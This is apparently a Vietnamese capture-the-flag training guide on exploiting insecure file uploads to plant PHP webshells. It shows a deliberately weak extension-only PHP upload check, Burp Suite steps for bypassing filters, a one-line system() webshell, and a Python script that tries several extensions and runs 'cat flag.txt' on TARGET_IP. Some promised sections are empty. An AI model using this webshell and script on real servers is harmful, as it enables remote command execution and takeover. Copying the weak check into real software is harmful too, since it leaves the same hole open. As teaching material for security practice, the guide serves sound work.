Khi trang web cho phép bạn tải file lên (avatar, tài liệu, báo cáo...) và không kiểm tra kỹ file đó thực sự là gì — bạn có thể tải lên một file code (thường là PHP), khiến server chạy code đó mỗi khi ai mở file lên, biến nó thành "cửa hậu" (webshell) để gửi lệnh tùy ý tới server.

File Upload khai thác là gì, để làm gì?

Website nào cũng có lúc cần nhận file từ người dùng: ảnh đại diện, CV, báo cáo. Server cần phân biệt "file này an toàn (ảnh, PDF)" với "file này nguy hiểm (code chạy được)". Nếu việc kiểm tra đó làm sai — chỉ nhìn đuôi file, chỉ nhìn Content-Type do chính bạn khai báo, hoặc không kiểm tra gì cả — bạn tải lên một file .php chứa code, rồi chỉ cần mở đúng URL của file đó là server tự chạy code trong đó, y như bạn đang gõ lệnh trực tiếp trên server.

Nếu chỉ nhớ một điều File bạn tải lên **không nguy hiểm vì nó là file** — nó nguy hiểm vì sau đó server chạy nó như code. Vậy luôn có 2 việc phải làm: (1) đưa được file độc lên server, (2) tìm cách khiến server thực thi file đó (thường bằng cách mở đúng URL của file vừa upload).
⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay
⚡ FILE UPLOAD → WEBSHELL
🚩 Nhận ra trong 30 giây Có form upload avatar/CV/ảnh/báo cáo. Upload thử file .php chứa <?php echo "test123"; ?> → nếu mở lại URL file đó thấy chữ test123 in ra (không phải mã nguồn PHP nguyên văn) ⟹ server đã CHẠY file, không chỉ lưu.
✅ Tiền đề cần có Biết (hoặc đoán được) URL nơi file upload được lưu sau khi tải lên thành công (xem Response, thường trả về đường dẫn).
🔍 Dò nhanh bằng Burp Repeater: upload file .php thường trước (xem có bị chặn ngay không) → nếu chặn, thử đổi đuôi/Content-Type/magic byte (mục 06) → mỗi lần thử, Send và kiểm tra cả Response upload LẪN việc mở lại file đó có chạy không.

01 / NỀN TẢNG BẮT BUỘC

Những thứ cần hiểu trước

Multipart/form-data — định dạng HTTP request đặc biệt dùng khi upload file (khác với JSON/form thường). Request có nhiều "phần" (part), mỗi phần có thể là 1 trường text hoặc 1 file kèm tên, loại (Content-Type do trình duyệt bạn tự khai báo, không phải server tự xác định).
Webshell — một file code (thường PHP) khi được server chạy sẽ cho phép bạn gửi lệnh hệ thống qua tham số URL, biến nó thành "cửa hậu" điều khiển server từ xa qua trình duyệt/script.
Magic byte (magic number) — vài byte đầu tiên cố định của 1 định dạng file, dùng để nhận diện thật sự loại file (không dựa vào đuôi tên file, vốn chỉ là chữ). Ví dụ ảnh JPEG luôn bắt đầu bằng FF D8 FF, PNG bắt đầu bằng 89 50 4E 47.

Code phía server hay kiểm tra kiểu (nhiều lỗ hổng do kiểm tra không đủ chặt):

// PHP — chỉ kiểm tra ĐUÔI tên file, không kiểm tra nội dung thật
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if (in_array($ext, ['jpg','png','gif'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name']);
}

Vấn đề: chỉ nhìn tên file (chữ do bạn tự đặt, tự ý sửa được) chứ không nhìn nội dung thật của file.

02 / VÌ SAO LỖ HỔNG TỒN TẠI

3 bước kiểm tra, chỉ cần 1 bước sai là đủ

Để upload an toàn, server đáng lẽ phải kiểm tra cả 3 thứ sau, nhưng code thực tế hay chỉ làm 1-2 trong số đó:

1
Tên file / đuôi file
Do người upload tự đặt — không đáng tin, chỉ nên dùng để gợi ý, không phải để quyết định.
2
Content-Type trong request
Cũng do trình duyệt/script của người upload tự khai báo — hoàn toàn giả mạo được (xem mục 06).
3
Nội dung thật của file (magic byte, parse thử)
Thứ duy nhất đáng tin — nhưng nhiều app bỏ qua bước này vì "đã check đuôi rồi".

Và dù cả 3 bước trên có đúng hết, vẫn còn vế thứ hai của vấn đề: server có thực thi file trong thư mục upload không? Nếu thư mục upload nằm trong vùng mà web server (Apache/Nginx) cấu hình "chạy PHP", việc chặn đuôi .php là tuyến phòng thủ duy nhất — chặn thiếu 1 biến thể đuôi là đủ để webshell chạy được.

03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI

Upload rồi mở lại — 2 bước tách biệt

Điểm mấu chốt hay bị người mới bỏ qua: upload thành công không có nghĩa là đã khai thác xong. Upload chỉ là bước 1 — đưa file lên server. Bước 2 (mở lại đúng URL file đó) mới là lúc server thực thi code. Nhiều người mới dừng lại ngay sau khi thấy "Upload thành công!" mà quên luôn bước 2.

05 / KHAI THÁC BẰNG BURP SUITE

Bấm gì (từng bước)

Bước 1 — bắt request upload
  1. Burp Proxy bật Intercept, upload 1 file ảnh thường qua form trên web.
  2. Request bị giữ lại, dạng multipart/form-data — bạn sẽ thấy phần nội dung file nằm ngay trong body request, kèm tên file và Content-Type.
  3. Send to Repeater.
Bước 2 — sửa thành file độc, thử nhiều biến thể
  1. Trong Repeater, sửa 3 chỗ độc lập để thử: tên file (đổi đuôi), Content-Type khai báo trong phần đó, và nội dung file (thay bằng code PHP).
  2. Send, đọc Response xem upload có bị từ chối không.
  3. Nếu chấp nhận, mở tab mới (hoặc dùng request GET khác trong Repeater) gọi đúng URL file vừa upload kèm tham số lệnh, đọc Response xem code có chạy không.
Mẹo: giữ nguyên phần ảnh JPEG thật ở đầu file (magic byte) rồi nối thêm code PHP ngay sau — vượt được kiểm tra magic byte đơn giản (xem mục 06).

(A) Bản thủ công — để HIỂU từng bước

(B) Bản gọn chắc — dò nhiều đuôi tự động, trích thẳng flag

import re, requests

FLAG_RE = re.compile(r"FHACKER2026\{[0-9a-f]{64}\}")
EXTS = ["php", "phtml", "php5", "pHp"]
SHELL = b'<?php system($_GET["c"]); ?>'

def exploit_upload(host):
    for ext in EXTS:
        fname = f"shell.{ext}"
        r = requests.post(f"http://{host}/upload",
                files={"file": (fname, SHELL, "image/jpeg")}, timeout=5)
        if r.status_code != 200:
            continue
        check = requests.get(f"http://{host}/uploads/{fname}",
                params={"c": "cat flag.txt"}, timeout=5)
        m = FLAG_RE.search(check.text)
        if m:
            return m.group()
    return None

print("FLAG:", exploit_upload("TARGET_IP"))

(C) Bản A/D tái dùng — chạy mọi đội, mọi round

Luyện tập

⭐ Làm lại: dựng ví dụ mục 09 bằng tay trên Burp, từ upload thường tới khi chạy được lệnh qua webshell.
